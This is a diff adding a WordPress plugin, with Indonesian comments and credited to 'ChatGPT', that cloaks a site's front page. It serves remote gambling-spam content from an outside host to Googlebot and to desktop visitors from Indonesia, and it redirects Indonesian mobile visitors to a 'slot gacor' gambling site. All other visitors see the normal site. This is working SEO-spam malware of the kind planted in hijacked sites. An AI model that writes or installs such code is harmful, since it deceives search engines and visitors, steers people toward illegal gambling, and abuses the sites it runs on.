@@ -1,0 +1,77 @@
+<?php
+/*
+Plugin Name: Custom Index Cloaker
+Description: Plugin cloaking hanya untuk halaman index utama. Googlebot dapat konten khusus, user mobile redirect, desktop tampil konten custom.
+Version: 1.0
+Author: ChatGPT
+*/
+
+add_action('template_redirect', 'custom_index_cloaker');
+
+function custom_index_cloaker() {
+    // Jalankan hanya di halaman utama
+    if (!is_front_page() && !is_home()) return;
+
+    if (is_admin() || (defined('DOING_AJAX') && DOING_AJAX)) return;
+
+    // Informasi dasar
+    $ip         = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+    $ua         = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $isMobile   = preg_match('/Mobile|Android|iPhone|iPad/i', $ua);
+    $isGoogle   = preg_match('/Googlebot|Googlebot-Mobile|Googlebot-Image/i', $ua);
+
+    // Konfigurasi
+    $desktopUrl = 'https://added-cloud.cc/packdol/getcontent/prokaltim/slot-gacor.txt';
+    $mobileUrl  = 'https://slot-gacor-penuh-misteri.web.app/';
+
+    // Deteksi negara via IP-API
+    $countryKey = 'geo_' . md5($ip);
+    $country = get_transient($countryKey);
+    if (!$country) {
+        $country = get_country_by_ip($ip);
+        set_transient($countryKey, $country, 12 * HOUR_IN_SECONDS);
+    }
+
+    // Cloaking logic
+    if ($isGoogle) {
+        $content = fetch_external_content($desktopUrl);
+        if ($content) {
+            echo $content;
+            exit;
+        }
+    } elseif ($country === 'Indonesia') {
+        if ($isMobile) {
+            wp_redirect($mobileUrl);
+            exit;
+        } else {
+            $content = fetch_external_content($desktopUrl);
+            if ($content) {
+                echo $content;
+                exit;
+            }
+        }
+    }
+    // Selain itu biarkan WP berjalan normal
+}
+
+function get_country_by_ip($ip) {
+    $api = "http://ip-api.com/json/{$ip}";
+    $response = wp_remote_get($api, ['timeout' => 3]);
+
+    if (is_wp_error($response)) return 'Unknown';
+
+    $body = wp_remote_retrieve_body($response);
+    $data = json_decode($body, true);
+
+    if (isset($data['status']) && $data['status'] === 'success') {
+        return $data['country'] ?? 'Unknown';
+    }
+
+    return 'Unknown';
+}
+
+function fetch_external_content($url) {
+    $response = wp_remote_get($url, ['timeout' => 5]);
+    if (is_wp_error($response)) return null;
+    return wp_remote_retrieve_body($response);
+}
